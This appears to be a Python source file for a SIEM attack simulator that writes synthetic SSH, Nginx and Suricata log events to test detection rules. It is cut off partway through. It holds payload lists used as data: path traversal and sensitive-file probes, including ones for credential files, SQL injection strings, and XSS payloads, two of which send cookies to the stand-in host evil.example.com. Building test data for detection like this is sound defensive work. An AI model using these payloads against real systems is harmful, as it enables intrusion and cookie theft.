# /tools/attack_simulator.py
# ═══════════════════════════════════════════════════════════════════════════════
#  SIEM Attack Simulator  ·  v3.1  (Filebeat/Logstash Edition + Web Attacks)
#  ─────────────────────────────────────────────────────────────────────────────
#
#  v3.0:  SSH/sudo log simulation via realistic syslog lines
#  v3.1:  + Nginx access log simulation for 5 web attack types:
#             web_path_traversal  → event.action: web_path_traversal_attempt
#             web_sql_injection   → event.action: web_sql_injection_attempt
#             web_xss             → event.action: web_xss_attempt
#             web_sensitive_file  → event.action: web_sensitive_file_probe
#             web_404_scanning    → event.action: web_404
#
#  Web attack log lines are written to a SEPARATE Filebeat-watched file
#  (default: /var/log/nginx/access.log) so that the Logstash pipeline
#  for Nginx (grok: COMBINEDAPACHELOG) remains distinct from the sshd
#  pipeline (grok: SYSLOGTIMESTAMP).
#
#  ECS fields populated by Logstash after parsing:
#    [url][original]                ← request path + query
#    [http][response][status_code]  ← HTTP status
#    [user_agent][original]         ← User-Agent header
#    [source][ip]                   ← client IP
#    event.action                   ← web attack type tag
#    tags                           ← ready_for_detection  (exploit-class web events; 404 scanning uses event.action web_404)
#
#  ─────────────────────────────────────────────────────────────────────────────
#  ARCHITECTURE SUMMARY  (unchanged from v3.0 except web log path)
#  ─────────────────────────────────────────────────────────────────────────────
#
#  script → realistic log lines → file → Filebeat → Logstash → ES
#
#  The simulator NEVER touches any database client.
#
#  ─────────────────────────────────────────────────────────────────────────────
#  DESIGN PRINCIPLES  (unchanged)
#  ─────────────────────────────────────────────────────────────────────────────
#
#  1. DETERMINISTIC — every run of the same scenario produces the same
#     causal structure.  Timestamps are computed backwards from NOW.
#  2. ISOLATED — every scenario uses a dedicated IP + user namespace.
#  3. SEQUENTIAL — log lines written in strict causal order, fsync between
#     phases so Filebeat sees a clean ordered stream.
#  4. SELF-DOCUMENTING — every scenario prints a structured execution log.
#
#  ─────────────────────────────────────────────────────────────────────────────
#  TIMING MODEL  (shared by all scenarios)
#  ─────────────────────────────────────────────────────────────────────────────
#
#   Past ◄──────────────────────────────────────────────────────────► Now
#         T-120s ────── T-61s   T-60s   T-30s ────── T-1s
#         [  ATTACK PHASE  ]   [SUC]   [  PRIVESC PHASE  ]
#
#   Web attacks occupy the ATTACK PHASE window (T-120s → T-61s) by default.
#
#  ─────────────────────────────────────────────────────────────────────────────
#  IP NAMESPACE  (NEVER let ranges overlap)
#  ─────────────────────────────────────────────────────────────────────────────
#
#   10.0.0.x        → ssh_bruteforce / password_spray scenarios
#   10.0.1.x        → post_compromise_privesc scenario
#   172.16.10.x     → user_bruteforce attacker IPs  (failure only, never success)
#   172.16.20.x     → distributed_bruteforce attacker IPs  (failure only)
#   10.99.0.x       → clean success IPs for user-family scenarios
#   192.168.99.x    → pure isolation tests (no incident expected)
#   10.10.0.x       → web attack scenarios  ← NEW in v3.1
#
#  ─────────────────────────────────────────────────────────────────────────────
#  LOG FORMATS
#  ─────────────────────────────────────────────────────────────────────────────
#
#  syslog / auth.log  (SSH + sudo):
#    Apr 21 10:00:00 hostname sshd[1234]: Failed password for root from 10.0.0.1 port 2200 ssh2
#
#  Nginx combined access log  (web attacks):
#    10.10.0.1 - - [21/Apr/2024:10:00:00 +0000] "GET /etc/passwd HTTP/1.1" 404 162 "-" "Mozilla/5.0"
#
#  ─────────────────────────────────────────────────────────────────────────────
#  SCENARIO REGISTRY  (v3.1 additions marked ★)
#  ─────────────────────────────────────────────────────────────────────────────
#
#  Pure attack-only  (SSH/sudo: no incident without a follow-on success chain):
#    ssh_bruteforce            → alert: ssh_bruteforce_by_ip
#    password_spray            → alert: password_spray_by_ip
#    user_bruteforce           → alert: user_bruteforce_by_user
#    distributed_bruteforce    → alert: distributed_bruteforce_by_user
#    sudo_bruteforce           → alert: sudo_bruteforce_by_user
#  Pure attack-only — Web  (alerts + incidents from incident_engine on correlation):
#    web_path_traversal   ★    → event.action web_path_traversal_attempt + ready_for_detection → alert web_path_traversal
#    web_sql_injection    ★    → event.action web_sql_injection_attempt + ready_for_detection → alert web_sql_injection
#    web_xss              ★    → event.action web_xss_attempt + ready_for_detection → alert web_xss
#    web_sensitive_file   ★    → event.action web_sensitive_file_probe + ready_for_detection → alert web_sensitive_file
#    web_404_scanning     ★    → event.action web_404 (volume threshold) → alert web_404_scanning → incident Web Attack / Reconnaissance if alone
#
#  Pure success-only  (no alert, no incident):
#    ssh_success_only
#    sudo_success_only
#
#  2-stage compound  (incident expected):
#    full_attack_chain         → SSH BF → Compromise
#    password_spray_chain      → Password Spray → Compromise
#    targeted_account_chain    → User BF → Compromise
#    distributed_attack_chain  → Distributed BF → Compromise
#
#  3-stage compound  (incident expected):
#    full_privesc_chain        → SSH BF → Compromise → Privesc
#    targeted_privesc_chain    → User BF → Compromise → Privesc
#    distributed_privesc_chain → Distributed BF → Compromise → Privesc
#
# ═══════════════════════════════════════════════════════════════════════════════

from __future__ import annotations

import argparse
import json
import os
import time
from datetime import datetime, timedelta, timezone
from typing import List

# ── Constants ─────────────────────────────────────────────────────────────────

# Default auth log file watched by Filebeat (SSH / sudo scenarios).
DEFAULT_LOG_FILE = os.environ.get("SIEM_LOG_FILE", "/var/log/auth.log")

# Default Nginx access log file watched by Filebeat (web attack scenarios).
DEFAULT_WEB_LOG_FILE = os.environ.get("SIEM_WEB_LOG_FILE", "/home/abdu/nginx-logs/access.log")

# Default Suricata EVE JSON file watched by Filebeat (network attack scenarios).
DEFAULT_NETWORK_LOG_FILE = os.environ.get("SIEM_NETWORK_LOG_FILE", "/var/log/suricata/eve.json")
# Hostname embedded in every log line
SIMULATOR_HOSTNAME = os.environ.get("SIEM_HOSTNAME", "simulator-host")

# Default namespace (overridable via CLI)
DEFAULT_IP      = "10.0.0.55"
DEFAULT_USER    = "root"
DEFAULT_WEB_IP  = "10.10.0.55"   # web attack default IP  (v3.1)

# Timing offsets (seconds before NOW)
ATTACK_START  = 120   # attack window opens
ATTACK_END    = 61    # attack window closes
SUCCESS_AT    = 60    # compromise event
PRIVESC_START = 30    # privesc window opens
PRIVESC_END   = 1     # privesc window closes

# IP namespaces
USER_BF_ATTACKER_PREFIX  = "172.16.10"
DIST_BF_ATTACKER_PREFIX  = "172.16.20"
USER_FAMILY_SUCCESS_IP   = "10.99.0.1"
WEB_ATTACK_IP_PREFIX     = "10.10.0"    # v3.1 — web attack IP namespace

# Network attack namespace (Suricata EVE JSON scenarios).
NETWORK_RECON_ATTACKER_IP      = "10.20.0.50"
NETWORK_RECON_VICTIM_IP        = "172.20.36.11"
NETWORK_COMPROMISED_HOST_IP    = "172.20.36.11"
NETWORK_EXTERNAL_SUSPICIOUS_IP = "45.90.10.20"
NETWORK_DNS_RESOLVER_IP        = "8.8.8.8"

NETWORK_PORT_SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 443, 3306]
NETWORK_INTERNAL_SWEEP_TARGETS = [
    "172.20.36.10",
    "172.20.36.11",
    "172.20.36.12",
    "172.20.36.13",
    "172.20.36.14",
    "172.20.36.15",
    "172.20.36.16",
    "172.20.36.17",
]
NETWORK_SUSPICIOUS_PORTS = [4444, 1337, 31337, 6667, 9001, 5555, 8081]
NETWORK_SUSPICIOUS_DNS_NAMES = [
    "c2-command-control.test",
    "malware-update.test",
    "botnet-beacon.test",
]

NETWORK_MIN_COUNTS = {
    "network_port_scan": 10,
    "network_internal_sweep": 8,
    "network_suspicious_outbound": 1,
    "network_c2_beaconing": 8,
    "network_suspicious_dns": 3,
}

# Syslog date format — matches what syslog and auth.log use
# Example: "Apr 21 10:00:00"
SYSLOG_FMT = "%b %d %H:%M:%S"

# Nginx access log timestamp format — matches COMBINEDAPACHELOG grok
# Example: "21/Apr/2024:10:00:00 +0000"
NGINX_FMT = "%d/%b/%Y:%H:%M:%S +0000"

# Realistic User-Agent strings rotated across web log lines
_WEB_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "python-requests/2.31.0",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/8.4.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "WFuzz/3.1.0",
    "dirbuster/1.0-RC1",
    "libwww-perl/6.67",
]

# ── ANSI colour helpers ────────────────────────────────────────────────────────

RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
CYAN   = "\033[36m"
WHITE  = "\033[97m"
DIM    = "\033[2m"

def banner(text: str) -> None:
    width = 72
    print(f"\n{BOLD}{CYAN}{'═' * width}{RESET}")
    print(f"{BOLD}{CYAN}  {text}{RESET}")
    print(f"{BOLD}{CYAN}{'═' * width}{RESET}")

def phase(label: str) -> None:
    print(f"\n{BOLD}{YELLOW}  ▶  {label}{RESET}")

def ok(msg: str) -> None:
    print(f"  {GREEN}✔{RESET}  {msg}")

def info(msg: str) -> None:
    print(f"  {DIM}{WHITE}·{RESET}  {DIM}{msg}{RESET}")

def expect(msg: str) -> None:
    print(f"  {CYAN}⟹{RESET}  {CYAN}{msg}{RESET}")

def warn(msg: str) -> None:
    print(f"  {RED}⚠{RESET}  {RED}{msg}{RESET}")


# ── Timestamp helpers ──────────────────────────────────────────────────────────

def utc_now() -> datetime:
    return datetime.now(timezone.utc)

def _ts_dt(offset_seconds: int) -> datetime:
    """datetime exactly `offset_seconds` before now."""
    return utc_now() - timedelta(seconds=offset_seconds)

def _ts_spread_dt(start_off: int, end_off: int, count: int, idx: int) -> datetime:
    """
    Distribute `count` events evenly across [start_off, end_off].
    Returns the datetime for event at position `idx`.
    """
    if count == 1:
        return _ts_dt(start_off)
    step = (start_off - end_off) / (count - 1)
    return _ts_dt(int(start_off - step * idx))

def _fmt_syslog(dt: datetime) -> str:
    """
    Format a datetime as a syslog timestamp.
    Example output: "Apr 21 10:00:00"
    """
    raw = dt.strftime(SYSLOG_FMT)
    if raw[4] == "0":
        raw = raw[:4] + " " + raw[5:]
    return raw

def _fmt_nginx(dt: datetime) -> str:
    """
    Format a datetime as an Nginx access log timestamp.
    Example output: "21/Apr/2024:10:00:00 +0000"
    Logstash COMBINEDAPACHELOG grok expects this format.
    """
    return dt.strftime(NGINX_FMT)


# ── Syslog log-line builders ───────────────────────────────────────────────────

def _line_auth_failed(dt: datetime, ip: str, user: str, port: int) -> str:
    """
    Produces:
      Apr 21 10:00:00 simulator-host sshd[1234]: Failed password for root from 10.0.0.1 port 2200 ssh2
    Logstash event_type → failed_login
    """
    pid = 1000 + (port % 9000)
    return (
        f"{_fmt_syslog(dt)} {SIMULATOR_HOSTNAME} sshd[{pid}]: "
        f"Failed password for {user} from {ip} port {port} ssh2"
    )


def _line_auth_success(dt: datetime, ip: str, user: str) -> str:
    """
    Produces:
      Apr 21 10:01:00 simulator-host sshd[2200]: Accepted password for root from 10.0.0.1 port 54321 ssh2
    Logstash event_type → success_login
    """
    return (
        f"{_fmt_syslog(dt)} {SIMULATOR_HOSTNAME} sshd[2200]: "
        f"Accepted password for {user} from {ip} port 54321 ssh2"
    )


def _line_sudo_failed(dt: datetime, ip: str, user: str, seq: int) -> str:
    """
    Produces:
      Apr 21 10:02:00 simulator-host sudo[3000]: root : authentication failure ; tty=pts/0 ; pwd=/home/root ; user=root
    Logstash event_type → sudo_failed
    """
    pid = 3000 + seq
    return (
        f"{_fmt_syslog(dt)} {SIMULATOR_HOSTNAME} sudo[{pid}]: "
        f"{user} : authentication failure ; "
        f"tty=pts/0 ; pwd=/home/{user} ; user=root"
    )


def _line_sudo_success(dt: datetime, user: str, seq: int) -> str:
    """
    Produces:
      Apr 21 10:03:00 simulator-host sudo[3001]: root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/bin/bash
    Logstash event_type → sudo_success
    """
    pid = 4000 + seq
    return (
        f"{_fmt_syslog(dt)} {SIMULATOR_HOSTNAME} sudo[{pid}]: "
        f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash"
    )


# ── Nginx log-line builders  (v3.1) ───────────────────────────────────────────
#
#  All builders return a standard Nginx combined log line:
#
#    <ip> - - [<nginx_timestamp>] "<method> <url> HTTP/1.1" <status> <size> "<referrer>" "<user_agent>"
#
#  Logstash grok (COMBINEDAPACHELOG) will extract:
#    clientip   → source.ip
#    timestamp  → @timestamp
#    request    → url.original
#    response   → http.response.status_code
#    agent      → user_agent.original
#
#  A downstream Logstash filter then sets event.action and (where applicable)
#  adds the "ready_for_detection" tag based on matching url.original patterns.
#
#  Status codes are realistic:
#    Path traversal / sensitive files  → 200 (server responded — dangerous) or 404
#    SQL injection / XSS               → 200 (payload reached the app)
#    404 scanning                      → 404 (path doesn't exist)
#
#  Body sizes are plausible but fixed per type for determinism.

def _nginx_line(dt: datetime, ip: str, method: str, url: str,
                status: int, size: int, referrer: str,
                user_agent: str) -> str:
    """
    Core Nginx combined-format line builder.
    All web log-line builders delegate here.

    Output example:
      10.10.0.1 - - [21/Apr/2024:10:00:00 +0000] "GET /etc/passwd HTTP/1.1" 200 1234 "-" "python-requests/2.31.0"
    """
    return (
        f"{ip} - - [{_fmt_nginx(dt)}] "
        f'"{method} {url} HTTP/1.1" {status} {size} '
        f'"{referrer}" "{user_agent}"'
    )


def _pick_ua(seq: int) -> str:
    """Round-robin through realistic user-agent strings."""
    return _WEB_USER_AGENTS[seq % len(_WEB_USER_AGENTS)]


# ── Path Traversal ─────────────────────────────────────────────────────────────

# Realistic path-traversal probe URLs.
# Mix of direct /etc/passwd and traversal-encoded variants.
_PATH_TRAVERSAL_URLS = [
    "/etc/passwd",
    "/etc/shadow",
    "/../../../etc/passwd",
    "/../../../../etc/passwd",
    "/%2e%2e/%2e%2e/etc/passwd",
    "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/static/../../../etc/passwd",
    "/images/../../../../etc/shadow",
    "/api/v1/../../etc/passwd",
    "/download?file=../../../etc/passwd",
    "/files/../../../../proc/self/environ",
    "/assets/../../windows/win.ini",
]

def _line_web_path_traversal(dt: datetime, ip: str, url: str, seq: int) -> str:
    """
    Produces an Nginx line for a path traversal probe.

    Status 200: attacker received file contents — most alarming case.
    Status 404: server rejected the path (still logged, still triggers alert).
    Alternates for realism.

    Logstash event.action → web_path_traversal_attempt
    ECS tags              → ready_for_detection
    """
    status    = 200 if seq % 3 != 0 else 404
    size      = 1548 if status == 200 else 162
    return _nginx_line(dt, ip, "GET", url, status, size, "-", _pick_ua(seq))


def _line_web_sql_injection(dt: datetime, ip: str, url: str, seq: int) -> str:
    """
    Produces an Nginx line for an SQL injection attempt.

    Status 200: payload reached the application layer.
    Status 500: app threw an error on malformed SQL (also suspicious).
    Alternates for realism.

    Logstash event.action → web_sql_injection_attempt
    ECS tags              → ready_for_detection
    """
    status = 500 if seq % 4 == 0 else 200
    size   = 512 if status == 200 else 1024
    return _nginx_line(dt, ip, "GET", url, status, size, "-", _pick_ua(seq))


def _line_web_xss(dt: datetime, ip: str, url: str, seq: int) -> str:
    """
    Produces an Nginx line for a cross-site scripting probe.

    Status 200: payload reached the app (reflected / stored XSS test).
    Status 400: server-side WAF or input validation rejected the payload.

    Logstash event.action → web_xss_attempt
    ECS tags              → ready_for_detection
    """
    status = 400 if seq % 5 == 0 else 200
    size   = 748 if status == 200 else 162
    return _nginx_line(dt, ip, "GET", url, status, size, "-", _pick_ua(seq))


def _line_web_sensitive_file(dt: datetime, ip: str, url: str, seq: int) -> str:
    """
    Produces an Nginx line for a sensitive file probe.

    Status 200: file exists and was served — critical finding.
    Status 403: file protected by server config.
    Status 404: file not present (still logged — attacker enumeration).

    Logstash event.action → web_sensitive_file_probe
    ECS tags              → ready_for_detection
    """
    cycle  = seq % 3
    status = [200, 403, 404][cycle]
    size   = [4096, 162, 162][cycle]
    return _nginx_line(dt, ip, "GET", url, status, size, "-", _pick_ua(seq))


def _line_web_404(dt: datetime, ip: str, url: str, seq: int) -> str:
    """
    Produces an Nginx line for a 404-scanning probe.

    Status always 404: attacker is enumerating non-existent paths.

    Logstash event.action → web_404
    ECS tags              → NOT tagged ready_for_detection
                            (high volume, low fidelity — informational only)
    """
    return _nginx_line(dt, ip, "GET", url, 404, 162, "-", _pick_ua(seq))


# ── Web attack URL corpora ─────────────────────────────────────────────────────

_SQL_INJECTION_URLS = [
    "/search?q=1'+union+select+null,null,null--",
    "/login?user=admin'--&pass=x",
    "/product?id=1+OR+1=1",
    "/api/users?id=1;SELECT+sleep(5)--",
    "/index.php?page=1'+AND+1=CONVERT(int,@@version)--",
    "/catalog?cat=1+UNION+SELECT+table_name,null+FROM+information_schema.tables--",
    "/news?id=1+AND+extractvalue(1,concat(0x7e,(SELECT+version())))--",
    "/shop?item=1'+OR+'1'='1",
    "/admin/login?user='+OR+1=1--&pass=anything",
    "/api/v2/search?q='; DROP TABLE users;--",
    "/report?from=2024-01-01'+UNION+SELECT+user(),version()--",
    "/filter?brand=Nike'+AND+sleep(3)--",
]

_XSS_URLS = [
    "/search?q=<script>alert(1)</script>",
    "/comment?text=<img+src=x+onerror=alert(document.cookie)>",
    "/profile?name=<svg/onload=alert(1)>",
    "/feedback?msg=javascript:alert(1)",
    "/redirect?url=javascript:void(document.location='https://evil.example.com')",
    "/api/greet?name=<script>fetch('https://evil.example.com?c='+document.cookie)</script>",
    "/page?title=<body+onload=alert(1)>",
    "/track?label=';alert(String.fromCharCode(88,83,83))//",
    "/search?q=\"><script>alert(document.domain)</script>",
    "/render?html=<iframe+src=javascript:alert(1)>",
    "/bio?text=<details/open/ontoggle=alert(1)>",
    "/msg?content=<script>new+Image().src='https://evil.example.com/?c='+encodeURIComponent(document.cookie)</script>",
]

_SENSITIVE_FILE_URLS = [
    "/.env",
    "/wp-config.php",
    "/.git/config",
    "/backup.zip",
    "/dump.sql",
    "/database.sql",
    "/.git/HEAD",
    "/config/database.yml",
    "/.htpasswd",
    "/web.config",
    "/config.php.bak",
    "/server-status",
    "/.DS_Store",
    "/phpinfo.php",
    "/.aws/credentials",
    "/etc/nginx/nginx.conf",
]

_WEB_404_URLS = [
    "/admin",
    "/admin/login",
    "/wp-admin",
    "/phpmyadmin",
    "/manager/html",
    "/.well-known/security.txt",
    "/actuator/health",
    "/console",
    "/api/v1/admin",
    "/api/v2/admin",
    "/shell.php",
    "/cmd.php",
    "/upload.php",
    "/xmlrpc.php",
    "/.svn/entries",
    "/cgi-bin/test.cgi",
    "/test.php",
    "/info.php",
    "/server-info",
    "/robots.txt",
    "/.well-known/acme-challenge/test",
    "/crossdomain.xml",
    "/sitemap.xml.gz",
    "/old/index.php",
    "/backup/index.php",
]


# ── Web batch builders  (v3.1) ─────────────────────────────────────────────────

def _build_web_path_traversal_lines(ip: str, count: int,
                                     start_off: int, end_off: int) -> List[str]:
    """
    Generate `count` path-traversal Nginx log lines spread over
    [start_off, end_off] seconds before now.
    URLs rotate through _PATH_TRAVERSAL_URLS for realism.
    """
    lines = []
    for i in range(count):
        dt  = _ts_spread_dt(start_off, end_off, count, i)
        url = _PATH_TRAVERSAL_URLS[i % len(_PATH_TRAVERSAL_URLS)]
        lines.append(_line_web_path_traversal(dt, ip, url, i))
    return lines


def _build_web_sql_injection_lines(ip: str, count: int,
                                    start_off: int, end_off: int) -> List[str]:
    """
    Generate `count` SQL injection Nginx log lines spread over
    [start_off, end_off] seconds before now.
    """
    lines = []
    for i in range(count):
        dt  = _ts_spread_dt(start_off, end_off, count, i)
        url = _SQL_INJECTION_URLS[i % len(_SQL_INJECTION_URLS)]
        lines.append(_line_web_sql_injection(dt, ip, url, i))
    return lines


def _build_web_xss_lines(ip: str, count: int,
                          start_off: int, end_off: int) -> List[str]:
    """
    Generate `count` XSS probe Nginx log lines spread over
    [start_off, end_off] seconds before now.
    """
    lines = []
    for i in range(count):
        dt  = _ts_spread_dt(start_off, end_off, count, i)
        url = _XSS_URLS[i % len(_XSS_URLS)]
        lines.append(_line_web_xss(dt, ip, url, i))
    return lines


def _build_web_sensitive_file_lines(ip: str, count: int,
                                     start_off: int, end_off: int) -> List[str]:
    """
    Generate `count` sensitive-file probe Nginx log lines spread over
    [start_off, end_off] seconds before now.
    """
    lines = []
    for i in range(count):
        dt  = _ts_spread_dt(start_off, end_off, count, i)
        url = _SENSITIVE_FILE_URLS[i % len(_SENSITIVE_FILE_URLS)]
        lines.append(_line_web_sensitive_file(dt, ip, url, i))
    return lines


def _build_web_404_lines(ip: str, count: int,
                          start_off: int, end_off: int) -> List[str]:
    """
    Generate `count` 404-scanning Nginx log lines spread over
    [start_off, end_off] seconds before now.
    """
    lines = []
    for i in range(count):
        dt  = _ts_spread_dt(start_off, end_off, count, i)
        url = _WEB_404_URLS[i % len(_WEB_404_URLS)]
        lines.append(_line_web_404(dt, ip, url, i))
    return lines


# ── Syslog batch builders ──────────────────────────────────────────────────────

def _build_auth_failed_lines(ip: str, user: str,
                              start_off: int, end_off: int,
                              count: int) -> List[str]:
    lines = []
    for i in range(count):
        dt   = _ts_spread_dt(start_off, end_off, count, i)
        port = 2200 + i
        lines.append(_line_auth_failed(dt, ip, user, port))
    return lines


def _build_auth_failed_multi_ip_lines(ip_prefix: str, ip_start: int,
                                       user: str, start_off: int, end_off: int,
                                       count: int) -> List[str]:
    lines = []
    for i in range(count):
        ip   = f"{ip_prefix}.{ip_start + i}"
        dt   = _ts_spread_dt(start_off, end_off, count, i)
        port = 2200 + i
        lines.append(_line_auth_failed(dt, ip, user, port))
    return lines


def _build_spray_failure_lines(ip: str, count: int,
                                start_off: int, end_off: int) -> List[str]:
    users = ["root", "admin", "oracle", "mysql", "ubuntu",
             "dev", "backup", "ops", "test", "guest"]
    lines = []
    for i in range(count):
        user = users[i % len(users)]
        dt   = _ts_spread_dt(start_off, end_off, count, i)
        port = 2200 + i
        lines.append(_line_auth_failed(dt, ip, user, port))
    return lines


def _build_auth_success_line(ip: str, user: str, offset: int) -> str:
    dt = _ts_dt(offset)
    return _line_auth_success(dt, ip, user)


def _build_sudo_failed_lines(ip: str, user: str,
                              start_off: int, end_off: int,
                              count: int) -> List[str]:
    lines = []
    for i in range(count):
        dt = _ts_spread_dt(start_off, end_off, count, i)
        lines.append(_line_sudo_failed(dt, ip, user, i))
    return lines


def _build_sudo_success_lines(user: str, count: int,
                               start_off: int) -> List[str]:
    lines = []
    for i in range(count):
        dt = _ts_dt(start_off - i * 2)
        lines.append(_line_sudo_success(dt, user, i))
    return lines


# ── File writer ────────────────────────────────────────────────────────────────

def _write_phase(lines: List[str], label: str, log_file: str,
                 *, flush: bool = True) -> None:
    """
    Append log lines to the Filebeat-watched file.

    flush=True (default) calls fsync after writing so the OS flushes the
    kernel buffer to disk before we return.  This is the sequential
    guarantee: Filebeat will see Phase N fully written before Phase N+1
    starts, preserving causal order in the event stream.
    """
    try:
        with open(log_file, "a", buffering=1) as fh:
            for line in lines:
                fh.write(line + "\n")
            if flush:
                fh.flush()
                os.fsync(fh.fileno())
    except PermissionError:
        warn(f"Permission denied writing to {log_file}")
        warn("Run as root, or set --log-file / --web-log-file to a writable path.")
        raise
    except OSError as exc:
        warn(f"Could not write to {log_file}: {exc}")
        raise

    ok(f"Wrote {len(lines):>3d} log lines  [{label}]  → {log_file}")



# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK ATTACK HELPERS  (Suricata EVE JSON)
# ═══════════════════════════════════════════════════════════════════════════════

def _suricata_timestamp(offset_seconds: int = 0) -> str:
    """
    Return a Suricata-compatible UTC timestamp.

    Network simulation events must be indexed with a current UTC @timestamp
    newer than detection_engine/engine_state.json. Positive offset_seconds
    moves the timestamp forward from now, not backward.
    """
    dt = datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f%z")


def _suricata_timestamp_pair(offset_seconds: int = 0, duration_seconds: int = 1) -> tuple[str, str]:
    """
    Return Suricata-compatible flow start/end timestamps.
    """
    start = _suricata_timestamp(offset_seconds + duration_seconds)
    end = _suricata_timestamp(offset_seconds)
    return start, end


def _network_min_count(scenario: str, count: int) -> int:
    """
    Preserve --count behavior while guaranteeing the scenario crosses its rule
    threshold. If --count is lower than the required minimum, use the minimum.
    """
    return max(count, NETWORK_MIN_COUNTS[scenario])


def _app_proto_for_port(port: int, fallback: str = "tcp") -> str:
    """
    Return realistic Suricata app_proto values for common ports.
    """
    mapping = {
        21: "ftp",
        22: "ssh",
        23: "telnet",
        25: "smtp",
        53: "dns",
        80: "http",
        110: "pop3",
        139: "smb",
        443: "tls",
        3306: "mysql",
    }
    return mapping.get(port, fallback)


def _suricata_flow_id(src_ip: str, dest_ip: str, dest_port: int, seq: int, offset_seconds: int) -> int:
    """
    Build a deterministic numeric flow_id without relying on randomness.
    """
    seed = f"{src_ip}|{dest_ip}|{dest_port}|{seq}|{offset_seconds}"
    return 1_000_000_000_000_000 + (abs(hash(seed)) % 8_000_000_000_000_000)


def _append_json_line(path: str, obj: dict) -> None:
    """
    Append one JSON object as a single Suricata EVE line and fsync it so
    Filebeat can pick it up immediately.
    """
    directory = os.path.dirname(path)
    if directory:
        os.makedirs(directory, exist_ok=True)

    try:
        with open(path, "a", buffering=1) as fh:
            fh.write(json.dumps(obj, separators=(",", ":"), sort_keys=False) + "\n")
            fh.flush()
            os.fsync(fh.fileno())
    except PermissionError:
        warn(f"Permission denied writing to {path}")
        warn("Run as root, or set --network-log-file to a writable path.")
        raise
    except OSError as exc:
        warn(f"Could not write to {path}: {exc}")
        raise


def _write_suricata_flow(
    path: str,
    src_ip: str,
    dest_ip: str,
    dest_port: int,
    *,
    src_port: int | None = None,
    proto: str = "TCP",
    app_proto: str | None = None,
    bytes_toserver: int = 240,
    bytes_toclient: int = 80,
    offset_seconds: int = 0,
    seq: int = 0,
) -> dict:
    """
    Append one Suricata-style EVE flow event.
    """
    if src_port is None:
        src_port = 45000 + (seq % 10000)

    if app_proto is None:
        app_proto = _app_proto_for_port(dest_port)

    start_ts, end_ts = _suricata_timestamp_pair(offset_seconds, duration_seconds=1)
    timestamp = end_ts

    event = {
        "timestamp": timestamp,
        "flow_id": _suricata_flow_id(src_ip, dest_ip, dest_port, seq, offset_seconds),
        "in_iface": "eth0",
        "event_type": "flow",
        "src_ip": src_ip,
        "src_port": src_port,
        "dest_ip": dest_ip,
        "dest_port": dest_port,
        "ip_v": 4,
        "proto": proto,
        "app_proto": app_proto,
        "flow": {
            "pkts_toserver": 3,
            "pkts_toclient": 1,
            "bytes_toserver": bytes_toserver,
            "bytes_toclient": bytes_toclient,
            "start": start_ts,
            "end": end_ts,
            "age": 0,
            "state": "established",
            "reason": "timeout",
            "alerted": False,
            "tx_cnt": 1,
        },
    }
    _append_json_line(path, event)
    return event


def _write_suricata_dns(
    path: str,
    src_ip: str,
    dns_name: str,
    *,
    resolver_ip: str = NETWORK_DNS_RESOLVER_IP,
    rrtype: str = "A",
    src_port: int | None = None,
    offset_seconds: int = 0,
    seq: int = 0,
) -> dict:
    """
    Append one Suricata-style EVE DNS query event.
    """
    if src_port is None:
        src_port = 53000 + (seq % 1000)

    event = {
        "timestamp": _suricata_timestamp(offset_seconds),
        "flow_id": _suricata_flow_id(src_ip, resolver_ip, 53, seq, offset_seconds),
        "in_iface": "eth0",
        "event_type": "dns",
        "src_ip": src_ip,
        "src_port": src_port,
        "dest_ip": resolver_ip,
        "dest_port": 53,
        "ip_v": 4,
        "proto": "UDP",
        "app_proto": "dns",
        "dns": {
            "type": "query",
            "id": 1200 + seq,
            "rrname": dns_name,
            "rrtype": rrtype,
        },
    }
    _append_json_line(path, event)
    return event


def _network_summary(
    *,
    scenario: str,
    log_file: str,
    event_count: int,
    event_type: str,
    expected_alert: str,
    expected_incident: str,
    source_ip: str,
    expected_key: str | None = None,
    correlation: str | None = None,
) -> None:
    """
    Print consistent network scenario output.
    """
    ok(f"[NETWORK] Wrote {event_count} Suricata {event_type} event(s) to {log_file}")
    print(f"  {CYAN}[NETWORK]{RESET} Scenario: {scenario}")
    print(f"  {CYAN}[NETWORK]{RESET} Expected alert: {expected_alert}")
    print(f"  {CYAN}[NETWORK]{RESET} Expected incident: {expected_incident}")
    print(f"  {CYAN}[NETWORK]{RESET} Source IP: {source_ip}")
    if expected_key:
        print(f"  {CYAN}[NETWORK]{RESET} Expected incident key: {expected_key}")
    if correlation:
        print(f"  {CYAN}[NETWORK]{RESET} Expected correlation: {correlation}")


def run_network_port_scan(count: int, log_file: str) -> None:
    """
    Simulate a network port scan:
    same source IP + same destination IP + many unique destination ports.
    """
    scenario = "network_port_scan"
    event_count = _network_min_count(scenario, count)
    src_ip = NETWORK_RECON_ATTACKER_IP
    dest_ip = NETWORK_RECON_VICTIM_IP

    banner("Network Port Scan  [Suricata EVE JSON]")
    info(f"Source IP: {src_ip}")
    info(f"Destination IP: {dest_ip}")
    info(f"Events: {event_count}")
    info(f"Network log file: {log_file}")
    expect("Suricata event_type → flow")
    expect("Logstash event.action → network_flow")
    expect("Rule cardinality → destination_port")
    expect("Alert → network_port_scan")
    expect("Incident → Network Reconnaissance")

    phase("Network phase — unique destination ports")
    for i in range(event_count):
        dest_port = NETWORK_PORT_SCAN_PORTS[i % len(NETWORK_PORT_SCAN_PORTS)]
        _write_suricata_flow(
            log_file,
            src_ip,
            dest_ip,
            dest_port,
            src_port=45678 + i,
            proto="TCP",
            app_proto=_app_proto_for_port(dest_port),
            bytes_toserver=240 + i,
            bytes_toclient=80,
            offset_seconds=60 - min(i * 2, 59),
            seq=i,
        )

    _network_summary(
        scenario=scenario,
        log_file=log_file,
        event_count=event_count,
        event_type="flow",
        expected_alert="network_port_scan",
        expected_incident="Network Reconnaissance",
